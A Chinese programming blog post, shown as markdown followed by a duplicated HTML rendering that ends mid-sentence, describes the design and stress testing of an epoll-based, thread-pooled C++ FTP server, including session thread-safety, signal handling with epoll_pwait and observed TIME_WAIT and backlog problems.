线程安全的线程池类的设计\n\n- 见笔者的另一篇博文[Construct a Thread-Safe ThreadPool](https://h-zex.github.io/2019/03/20/construct-a-thread-safe-threadpool/)\n\n### Utility\n\n- 对于POSIX的 read、write等IO函数、accept等网络函数、epoll、pthread等函数创建wrap函数，用于处理各种错误，使得业务方可以简单的使用\n\n- 要根据manual，对所有可能出现的errno进行处理。我的处理方法是，对于可以明确知道不应该出现的errno，一旦出现，就调用bug函数；对于EINTR，根据需求进行再次尝试或返回；对于不明确是否是合法情况的错误，输出一个warning，然后不改变errno，返回给用户；尽量使得这些wrap函数不需要返回过于复杂的信息，能返回void尽量返回void，能返回bool就不要返回int\n\n- `ReadWithBuf`函数：学的是CSAPP的方法，让用户每次调用都传入一个相同的`ReadBuf`对象，在这个对象里存预读取的数据，这样子就可以每次读都读1024B（ReadBuf里面的buf的大小是1024B），从而减少read这个syscall调用的次数，可以提高效率\n\n### FTP类\n\n#### Session在多线程下的线程安全的保证\n\n- FTP类需要保证很重要的一点：任意一个session在任意一个时刻，只有小于等于1个线程正在handle该Session\n\n- 在代码里我是这样保证的\n\n  - 对于用户的cmdFd，epoll等待的事件不仅仅是`EPOLLIN`，还需要`EPOLLONESHOT`。`EPOLLONESHOT`的含义是，一旦一个Fd被从`epoll_wait`返回，那么其就不再从`epoll_wait`返回，即使有事件发生。直到用户对这个fd使用`EPOLL_CTL_MOD`调用`epoll_ctl`指示等待的事件\n\n    > EPOLLONESHOT (since Linux 2.6.2) Sets the one-shot behavior for the associated file descriptor. This means that after an event is pulled out with epoll_wait(2) the associated file descriptor is internally disabled and no other events will be reported by the epoll interface. The user must call epoll_ctl() with EPOLL_CTL_MOD to rearm the file descriptor with a new event mask. \n\n    从而使得，一个Session正在被handle的过程中，没有新的线程会去handle这个Session\n\n  - 创建新Session的函数epoll_wait、accept的函数在同一个线程，从而在创建新Session时，不会有新的线程去handle这个正在创建的Session\n\n  - destroySession时，持有一个mutex，从而，即使对应的cmdFd关闭了，**OS复用了这个fd**，但是其创建新Session会被阻塞，从而在该Session完全destroy之前，没有新线程会handle该Session\n\n#### 信号处理\n\n- 按照CSAPP建议的6条规则，逐一介绍以下\n- handler要尽可能简单，比如只是设置一个flag\n- handler里只能调用**异步信号安全**的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括`exit`、`printf`等常见函数\n- 保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno\n- 如果访问了全局的数据结构，那么需要阻塞所有信号。因为笔者的handler中只是设置了一个flag，而对`bool`型的flag的**读或写**，intel保证是原子的，所以无需如此\n  > 引用自*Intel® 64 and IA-32 Architectures Software Developer’s Manual* (2018 5 18), Vol.3A ch8\n  > - The Intel486 processor (and newer processors since) guarantees that the following basic **memory operations** will always be carried out atomically(`atomically`: That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.):\n  >    - **Reading or writing a byte**\n  >    - Reading or writing a word aligned on a 16-bit boundary\n  >    - Reading or writing a doubleword aligned on a 32-bit boundary\n- 使用`volatile`声明flag，`volatile`要求编译器每次在代码中引用flag时，都从内存中读取该值。不过需要注意的是，有些编译器下的`volatile`并没有类似于java中的`volatile`的内存可见性的保证\n   > Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, **anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f**.([引用自JSR 133 (Java Memory Model) FAQ](https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#volatile))\n- 使用`sig_atomic_t`声明变量。C99的`sig_atomic_t`有这么一段注释\n   ```c\n   /*\n    * C99: An integer type that can be accessed as an atomic entity,\n    * even in the presence of asynchronous interrupts.\n    * It is not currently necessary for this to be machine-specific.\n    */\n   ```\n   并且按照intel的manual，读或写一个byte是原子的，所以笔者直接用了`bool`\n- 还有一个很重要的点，race Condition。以下代码截取自FTP class\n    ```cpp\n    // make sure there is no race condition:\n    // the signal occur after check willExit and before epoll_wait\n    // then the epoll_wait may not wake up.\n    pthreadSigmaskWrap(SIG_BLOCK, &sigToBlock, &oldSigSet);\n    if (willExit) {\n        break;\n    }\n    int waitFdCnt = epollPWaitWrap(this->epollFd, evArray, evArraySize, -1, oldSigSet);\n    pthreadSigmaskWrap(SIG_SETMASK, &oldSigSet);\n    ```\n    为什么要写的这么麻烦，而不是直接使用`epoll_wait`。因为，虽然如果没有阻塞信号时，`epoll_wait`收到`SIGINT`会返回，但是，如果该信号是在检查了`willExit`标志之后、`epoll_wait`之前到来呢，那么，我们将错过这个信号——`epoll_wait`不会返回，从而没有机会去再次检查`willExit`。所以，需要在检查`willExit`与`epoll_wait`之间阻塞信号，并且要在`epoll_wait`期间不阻塞`SIGINT`，这意味着需要原子的做这件事情，这就是`epoll_pwait`帮我们做的\n    > ref from epoll_pwait manual\n    >\n    > The following epoll_pwait() call:\n    > \n    > ```c\n    >     ready = epoll_pwait(epfd, &events, maxevents, timeout, &sigmask);\n    > ```\n    > is equivalent to atomically executing the following calls:\n    > ```c\n    >     sigset_t origmask;\n    > \n    >     pthread_sigmask(SIG_SETMASK, &sigmask, &origmask);\n    >     ready = epoll_wait(epfd, &events, maxevents, timeout);\n    >     pthread_sigmask(SIG_SETMASK, &origmask, NULL);\n    > ```\n\n### 压测\n\n#### 压测步骤\n\n- 笔者的压测程序使用java写的，代码在这里[https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester](https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester)\n\n- 压测包括\n   - 登录\n   - 列出某个目录\n   - 上传100KB的文件\n   - 根据配置，`sleep(HANG_TIME)`，在C3K～C4K的测试结果中，`HANG_TIME=0`\n\n- 压测前，运行server的命令是\n\n  ```\n  ulimit -s unlimited -f unlimited -d unlimited -n unlimited \n  su root\n  echo 20000 >  /proc/sys/net/core/somaxconn\n  sudo ./FTPServer [port]  > /tmp/FTPServerOutput\n  ```\n  - 修改`somaxconn`是为了使得baclog足够大\n\n  - 将stdout重定向到`/tmp/FTPServerOutput`是为了使得错误信息清晰的显示出来\n\n  - 之所以需要`sudo`，是因为使用了OS的账户验证机制来实现用户登录\n\n  - `./FTPServer [port]`的`[port]`参数可以不指定，也就是直接`sudo ./FTPServer  > /tmp/FTPServerOutput`,这样将会监听在`8001`端口\n\n- 然后运行`java  -ea -jar -Dexternal.config=file:/tmp/1.properties FTPServerTester-1.0-SNAPSHOT.jar`\n\n  - `FTPServerTester-1.0-SNAPSHOT.jar`在根目录的`test`目录下（不是在`src/test`的那个`test`目录）\n\n  - `/tmp/1.properties`是配置文件，因为需要包含测试账户信息，所以需要自己定制，样例如下\n\n     ```properties\n     StressTest.TestCnt=10\n     StressTest.MaxCmdConnectionCnt=1000\n     StressTest.MaxThreadCnt=1024\n     # the time(millisecond) to hand on the connection\n     StressTest.HangTime=1000\n\n     # 你运行FTPServer的host的地址\n     Tester.TesterServerAddress=10.243.6.109\n\n     # 你运行Tester的host地址\n     # 必须保证运行server的host与运行tester的host是可以互通的\n     # 包括，tester可以主动链接server，server也可以主动链接tester\n     Tester.YourselfAddress=10.243.6.43\n\n     Tester.ServerPort=8001\n     # 系统上账户的用户名\n     Tester.UserName=\n     # 系统上账户的密码\n     Tester.Password=\n     # 这些是以逗号分隔的目录列表 \n     # 必须是绝对路径\n     # 这些目录数量应该>=20个，越多越好，太少的话，测试会很慢\n     # 因为多个用户访问少数几个目录会很慢\n     # 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录\n     # 如果运行在同一台机子上，测试程序会创建这些目录\n     Tester.ListTestDir=/tmp/testDir_1,/tmp/testDir_2,/tmp/testDir_3,/tmp/testDir_4,/tmp/testDir_5,/tmp/testDir_6,/tmp/testDir_7,/tmp/testDir_8,/tmp/testDir_9,/tmp/testDir_10,/tmp/testDir_11,/tmp/testDir_12,/tmp/testDir_13,/tmp/testDir_14,/tmp/testDir_15,/tmp/testDir_16,/tmp/testDir_17\n     # 这个目录必须是绝对路径\n     # 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录\n     # 如果运行在同一台机子上，测试程序会创建这些目录\n     Tester.StorTestDir=/tmp/FTPSeverTesterStorDirs____23233dd22/\n     ```\n\n#### 压测结果\n\n- 笔者的测试与server都跑在同一台机器上\n- 笔者在自己的机器上(Intel i7-8550U, 16G内存，没有SSD)，`StressTest.MaxCmdConnectionCnt`设为`10240`及以下时，测试可以顺利完成。并且在测试过程使用linux的`ftp`命令与server通信，是比较流畅的\n- 在如下设置测试参数后\n  ```properties\n   StressTest.MaxCmdConnectionCnt=10000\n   StressTest.MaxThreadCnt=4024\n   StressTest.HangTime=0\n   ```\n   `sudo watch -n 0.5 \"netstat -anp | grep -i <PID> | grep -i \"est\"  | wc -l \"`可以看到数目是3K到4K之间波动，并且测试期间手动与服务器通信是比较流畅的\n\n### 出现的问题\n\n- 测试程序开50k个链接连server进行操作（50k个测试是依次提交给线程池，边提交线程池边运行），server需要openListenFd，由OS指定端口，但是在测试程序成功进行了15k多一点的测试后，server的这个openListenFd失败，errno是` Address already in use`。\n\n  **我猜测**，可能是很多端口处于`TIME_WAIT`状态，虽然打开的socket设置了`SO_REUSEADDR`，可以绑定这些TIME_WAIT链接的端口，但是刚好，对端也是上一次那个链接的端口，这是TCP禁止的——TCP允许复用处于TIME_WAIT的端口，但是不允许新的链接与TIME_WAIT的链接的(serverIp, serverPort, serverIp, serverPort)相同（其实也不是一定禁止，TCP规范是允许有例外），所以就提示`Address already in use`\n\n- server listen的端口的backlog设太小（20），测试程序开的链接数一多，就有一些链接三次握手成功，但是hang住在读取welcome信息那里，详见笔者的另一篇博文[高并发情况下backlog过低出现的问题](https://h-zex.github.io/2019/03/19/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%83%85%E5%86%B5%E4%B8%8Bbacklog%E8%BF%87%E4%BD%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/)\n\n### 缺点\n\n- 因为使用是线程池，并且似乎一个线程不能设置另一个线程的uid（欢迎指正！），所以无法利用OS的机制实现权限控制\n- 只有单个线程accept，可以通过linux内核3.9的一个特性`SO_REUSEPORT`来实现多线程accept，并且没有惊群、负载不均衡的问题（[The SO_REUSEPORT socket option](https://lwn.net/Articles/542629/)）\n","content":"<h3 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h3><ul>\n<li>根据RFC959</li>\n<li>高并发(C3K~C4K)</li>\n</ul>\n<h3 id=\"架构\"><a href=\"#架构\" class=\"headerlink\" title=\"架构\"></a>架构</h3><ul>\n<li><p>在主线程使用epoll，监听listen在21端口的fd，和所有用户的命令链接的fd（以下均以cmdFd简称之）</p>\n</li>\n<li><p>一旦某个fd就绪，就将其封装成任务对象提交给线程池去执行</p>\n</li>\n<li><p>每个用户关联一个Session对象，根据RFC的要求，可以实现为，任意时刻只有小于等于一个线程在handle这个session对象</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ tree src/main </span><br><span class=\"line\">src/main</span><br><span class=\"line\">├── config</span><br><span class=\"line\">│   └── config.hpp</span><br><span class=\"line\">├── core</span><br><span class=\"line\">│   ├── FTP.hpp</span><br><span class=\"line\">│   ├── Login.hpp</span><br><span class=\"line\">│   ├── NetworkManager.hpp</span><br><span class=\"line\">│   └── Session.hpp</span><br><span class=\"line\">├── main.cpp</span><br><span class=\"line\">├── tools</span><br><span class=\"line\">│   ├── FileSystem.hpp</span><br><span class=\"line\">│   ├── ListFiles.hpp</span><br><span class=\"line\">│   └── ThreadPool.hpp</span><br><span class=\"line\">└── util</span><br><span class=\"line\">    ├── Def.hpp</span><br><span class=\"line\">    ├── NetUtility.hpp</span><br><span class=\"line\">    ├── ThreadUtility.hpp</span><br><span class=\"line\">    └── Utility.hpp</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"线程安全的线程池类的设计\"><a href=\"#线程安全的线程池类的设计\" class=\"headerlink\" title=\"线程安全的线程池类的设计\"></a>线程安全的线程池类的设计</h3><ul>\n<li>见笔者的另一篇博文<a href=\"https://h-zex.github.io/2019/03/20/construct-a-thread-safe-threadpool/\">Construct a Thread-Safe ThreadPool</a></li>\n</ul>\n<h3 id=\"Utility\"><a href=\"#Utility\" class=\"headerlink\" title=\"Utility\"></a>Utility</h3><ul>\n<li><p>对于POSIX的 read、write等IO函数、accept等网络函数、epoll、pthread等函数创建wrap函数，用于处理各种错误，使得业务方可以简单的使用</p>\n</li>\n<li><p>要根据manual，对所有可能出现的errno进行处理。我的处理方法是，对于可以明确知道不应该出现的errno，一旦出现，就调用bug函数；对于EINTR，根据需求进行再次尝试或返回；对于不明确是否是合法情况的错误，输出一个warning，然后不改变errno，返回给用户；尽量使得这些wrap函数不需要返回过于复杂的信息，能返回void尽量返回void，能返回bool就不要返回int</p>\n</li>\n<li><p><code>ReadWithBuf</code>函数：学的是CSAPP的方法，让用户每次调用都传入一个相同的<code>ReadBuf</code>对象，在这个对象里存预读取的数据，这样子就可以每次读都读1024B（ReadBuf里面的buf的大小是1024B），从而减少read这个syscall调用的次数，可以提高效率</p>\n</li>\n</ul>\n<h3 id=\"FTP类\"><a href=\"#FTP类\" class=\"headerlink\" title=\"FTP类\"></a>FTP类</h3><h4 id=\"Session在多线程下的线程安全的保证\"><a href=\"#Session在多线程下的线程安全的保证\" class=\"headerlink\" title=\"Session在多线程下的线程安全的保证\"></a>Session在多线程下的线程安全的保证</h4><ul>\n<li><p>FTP类需要保证很重要的一点：任意一个session在任意一个时刻，只有小于等于1个线程正在handle该Session</p>\n</li>\n<li><p>在代码里我是这样保证的</p>\n<ul>\n<li><p>对于用户的cmdFd，epoll等待的事件不仅仅是<code>EPOLLIN</code>，还需要<code>EPOLLONESHOT</code>。<code>EPOLLONESHOT</code>的含义是，一旦一个Fd被从<code>epoll_wait</code>返回，那么其就不再从<code>epoll_wait</code>返回，即使有事件发生。直到用户对这个fd使用<code>EPOLL_CTL_MOD</code>调用<code>epoll_ctl</code>指示等待的事件</p>\n<blockquote>\n<p>EPOLLONESHOT (since Linux 2.6.2) Sets the one-shot behavior for the associated file descriptor. This means that after an event is pulled out with epoll_wait(2) the associated file descriptor is internally disabled and no other events will be reported by the epoll interface. The user must call epoll_ctl() with EPOLL_CTL_MOD to rearm the file descriptor with a new event mask. </p>\n</blockquote>\n<p>从而使得，一个Session正在被handle的过程中，没有新的线程会去handle这个Session</p>\n</li>\n<li><p>创建新Session的函数epoll_wait、accept的函数在同一个线程，从而在创建新Session时，不会有新的线程去handle这个正在创建的Session</p>\n</li>\n<li><p>destroySession时，持有一个mutex，从而，即使对应的cmdFd关闭了，<strong>OS复用了这个fd</strong>，但是其创建新Session会被阻塞，从而在该Session完全destroy之前，没有新线程会handle该Session</p>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"信号处理\"><a href=\"#信号处理\" class=\"headerlink\" title=\"信号处理\"></a>信号处理</h4><ul>\n<li>按照CSAPP建议的6条规则，逐一介绍以下</li>\n<li>handler要尽可能简单，比如只是设置一个flag</li>\n<li>handler里只能调用<strong>异步信号安全</strong>的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括<code>exit</code>、<code>printf</code>等常见函数</li>\n<li>保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno</li>\n<li>如果访问了全局的数据结构，那么需要阻塞所有信号。因为笔者的handler中只是设置了一个flag，而对<code>bool</code>型的flag的<strong>读或写</strong>，intel保证是原子的，所以无需如此<blockquote>\n<p>引用自<em>Intel® 64 and IA-32 Architectures Software Developer’s Manual</em> (2018 5 18), Vol.3A ch8</p>\n<ul>\n<li>The Intel486 processor (and newer processors since) guarantees that the following basic <strong>memory operations</strong> will always be carried out atomically(<code>atomically</code>: That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.):<ul>\n<li><strong>Reading or writing a byte</strong></li>\n<li>Reading or writing a word aligned on a 16-bit boundary</li>\n<li>Reading or writing a doubleword aligned on a 32-bit boundary</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n</li>\n<li>使用<code>volatile</code>声明flag，<code>volatile</code>要求编译器每次在代码中引用flag时，都从内存中读取该值。不过需要注意的是，有些编译器下的<code>volatile</code>并没有类似于java中的<code>volatile</code>的内存可见性的保证<blockquote>\n<p>Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, <strong>anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f</strong>.(<a href=\"https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#volatile\" target=\"_blank\" rel=\"noopener\">引用自JSR 133 (Java Memory Model) FAQ</a>)</p>\n</blockquote>\n</li>\n<li><p>使用<code>sig_atomic_t</code>声明变量。C99的<code>sig_atomic_t</code>有这么一段注释</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * C99: An integer type that can be accessed as an atomic entity,</span></span><br><span class=\"line\"><span class=\"comment\"> * even in the presence of asynchronous interrupts.</span></span><br><span class=\"line\"><span class=\"comment\"> * It is not currently necessary for this to be machine-specific.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p> 并且按照intel的manual，读或写一个byte是原子的，所以笔者直接用了<code>bool</code></p>\n</li>\n<li><p>还有一个很重要的点，race Condition。以下代码截取自FTP class</p>\n  <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// make sure there is no race condition:</span></span><br><span class=\"line\"><span class=\"comment\">// the signal occur after check willExit and before epoll_wait</span></span><br><span class=\"line\"><span class=\"comment\">// then the epoll_wait may not wake up.</span></span><br><span class=\"line\">pthreadSigmaskWrap(SIG_BLOCK, &amp;sigToBlock, &amp;oldSigSet);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (willExit) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> waitFdCnt = epollPWaitWrap(<span class=\"keyword\">this</span>-&gt;epollFd, evArray, evArraySize, <span class=\"number\">-1</span>, oldSigSet);</span><br><span class=\"line\">pthreadSigmaskWrap(SIG_SETMASK, &amp;oldSigSet);</span><br></pre></td></tr></table></figure>\n<p>  为什么要写的这么麻烦，而不是直接使用<code>epoll_wait</code>。因为，虽然如果没有阻塞信号时，<code>epoll_wait</code>收到<code>SIGINT</code>会返回，但是，如果该信号是在检查了<code>willExit</code>标志之后、<code>epoll_wait</code>之前到来呢，那么，我们将错过这个信号——<code>epoll_wait</code>不会返回，从而没有机会去再次检查<code>willExit</code>。所以，需要在检查<code>willExit</code>与<code>epoll_wait</code>之间阻塞信号，并且要在<code>epoll_wait</code>期间不阻塞<code>SIGINT</code>，这意味着需要原子的做这件事情，这就是<code>epoll_pwait</code>帮我们做的</p>\n<blockquote>\n<p>ref from epoll_pwait manual</p>\n<p>The following epoll_pwait() call:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;     ready = epoll_pwait(epfd, &amp;events, maxevents, timeout, &amp;sigmask);</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>is equivalent to atomically executing the following calls:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;     <span class=\"keyword\">sigset_t</span> origmask;</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;     pthread_sigmask(SIG_SETMASK, &amp;sigmask, &amp;origmask);</span><br><span class=\"line\">&gt;     ready = epoll_wait(epfd, &amp;events, maxevents, timeout);</span><br><span class=\"line\">&gt;     pthread_sigmask(SIG_SETMASK, &amp;origmask, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"压测\"><a href=\"#压测\" class=\"headerlink\" title=\"压测\"></a>压测</h3><h4 id=\"压测步骤\"><a href=\"#压测步骤\" class=\"headerlink\" title=\"压测步骤\"></a>压测步骤</h4><ul>\n<li><p>笔者的压测程序使用java写的，代码在这里<a href=\"https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester\" target=\"_blank\" rel=\"noopener\">https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester</a></p>\n</li>\n<li><p>压测包括</p>\n<ul>\n<li>登录</li>\n<li>列出某个目录</li>\n<li>上传100KB的文件</li>\n<li>根据配置，<code>sleep(HANG_TIME)</code>，在C3K～C4K的测试结果中，<code>HANG_TIME=0</code></li>\n</ul>\n</li>\n<li><p>压测前，运行server的命令是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ulimit -s unlimited -f unlimited -d unlimited -n unlimited </span><br><span class=\"line\">su root</span><br><span class=\"line\">echo 20000 &gt;  /proc/sys/net/core/somaxconn</span><br><span class=\"line\">sudo ./FTPServer [port]  &gt; /tmp/FTPServerOutput</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>修改<code>somaxconn</code>是为了使得baclog足够大</p>\n</li>\n<li><p>将stdout重定向到<code>/tmp/FTPServerOutput</code>是为了使得错误信息清晰的显示出来</p>\n</li>\n<li><p>之所以需要<code>sudo</code>，是因为使用了OS的账户验证机制来实现用户登录</p>\n</li>\n<li><p><code>./FTPServer [port]</code>的<code>[port]</code>参数可以不指定，也就是直接<code>sudo ./FTPServer  &gt; /tmp/FTPServerOutput</code>,这样将会监听在<code>8001</code>端口</p>\n</li>\n</ul>\n</li>\n<li><p>然后运行<code>java  -ea -jar -Dexternal.config=file:/tmp/1.properties FTPServerTester-1.0-SNAPSHOT.jar</code></p>\n<ul>\n<li><p><code>FTPServerTester-1.0-SNAPSHOT.jar</code>在根目录的<code>test</code>目录下（不是在<code>src/test</code>的那个<code>test</code>目录）</p>\n</li>\n<li><p><code>/tmp/1.properties</code>是配置文件，因为需要包含测试账户信息，所以需要自己定制，样例如下</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StressTest.TestCnt=10</span><br><span class=\"line\">StressTest.MaxCmdConnectionCnt=1000</span><br><span class=\"line\">StressTest.MaxThreadCnt=1024</span><br><span class=\"line\"># the time(millisecond) to hand on the connection</span><br><span class=\"line\">StressTest.HangTime=1000</span><br><span class=\"line\"></span><br><span class=\"line\"># 你运行FTPServer的host的地址</span><br><span class=\"line\">Tester.TesterServerAddress=10.243.6.109</span><br><span class=\"line\"></span><br><span class=\"line\"># 你运行Tester的host地址</span><br><span class=\"line\"># 必须保证运行server的host与运行tester的host是可以互通的</span><br><span class=\"line\"># 包括，tester可以主动链接server，server也可以主动链接tester</span><br><span class=\"line\">Tester.YourselfAddress=10.243.6.43</span><br><span class=\"line\"></span><br><span class=\"line\">Tester.ServerPort=8001</span><br><span class=\"line\"># 系统上账户的用户名</span><br><span class=\"line\">Tester.UserName=</span><br><span class=\"line\"># 系统上账户的密码</span><br><span class=\"line\">Tester.Password=</span><br><span class=\"line\"># 这些是以逗号分隔的目录列表 </span><br><span class=\"line\"># 必须是绝对路径</span><br><span class=\"line\"># 这些目录数量应该&gt;=20个，越多越好，太少的话，测试会很慢</span><br><span class=\"line\"># 因为多个用户访问少数几个目录会很慢</span><br><span class=\"line\"># 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录</span><br><span class=\"line\"># 如果运行在同一台机子上，测试程序会创建这些目录</span><br><span class=\"line\">Tester.ListTestDir=/tmp/testDir_1,/tmp/testDir_2,/tmp/testDir_3,/tmp/testDir_4,/tmp/testDir_5,/tmp/testDir_6,/tmp/testDir_7,/tmp/testDir_8,/tmp/testDir_9,/tmp/testDir_10,/tmp/testDir_11,/tmp/testDir_12,/tmp/testDir_13,/tmp/testDir_14,/tmp/testDir_15,/tmp/testDir_16,/tmp/testDir_17</span><br><span class=\"line\"># 这个目录必须是绝对路径</span><br><span class=\"line\"># 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录</span><br><span class=\"line\"># 如果运行在同一台机子上，测试程序会创建这些目录</span><br><span class=\"line\">Tester.StorTestDir=/tmp/FTPSeverTesterStorDirs____23233dd22/</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"压测结果\"><a href=\"#压测结果\" class=\"headerlink\" title=\"压测结果\"></a>压测结果</h4><ul>\n<li>笔者的测试与server都跑在同一台机器上</li>\n<li>笔者在自己的机器上(Intel i7-8550U, 16G内存，没有SSD)，<code>StressTest.MaxCmdConnectionCnt</code>设为<code>10240</code>及以下时，测试可以顺利完成。并且在测试过程使用linux的<code>ftp</code>命令与server通信，是比较流畅的</li>\n<li><p>在如下设置测试参数后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StressTest.MaxCmdConnectionCnt=10000</span><br><span class=\"line\">StressTest.MaxThreadCnt=4024</span><br><span class=\"line\">StressTest.HangTime=0</span><br></pre></td></tr></table></figure>\n<p> <code>sudo watch -n 0.5 &quot;netstat -anp | grep -i &lt;PID&gt; | grep -i &quot;est&quot;  | wc -l &quot;</code>可以看到数目是3K到4K之间波动，并且测试期间手动与服务器通信是比较流畅的</p>\n</li>\n</ul>\n<h3 id=\"出现的问题\"><a href=\"#出现的问题\" class=\"headerlink\" title=\"出现的问题\"></a>出现的问题</h3><ul>\n<li><p>测试程序开50k个链接连server进行操作（50k个测试是依次提交给线程池，边提交线程池边运行），server需要openListenFd，由OS指定端口，但是在测试程序成功进行了15k多一点的测试后，server的这个openListenFd失败，errno是<code>Address already in use</code>。</p>\n<p><strong>我猜测</strong>，可能是很多端口处于<code>TIME_WAIT</code>状态，虽然打开的socket设置了<code>SO_REUSEADDR</code>，可以绑定这些TIME_WAIT链接的端口，但是刚好，对端也是上一次那个链接的端口，这是TCP禁止的——TCP允许复用处于TIME_WAIT的端口，但是不允许新的链接与TIME_WAIT的链接的(serverIp, serverPort, serverIp, serverPort)相同（其实也不是一定禁止，TCP规范是允许有例外），所以就提示<code>Address already in 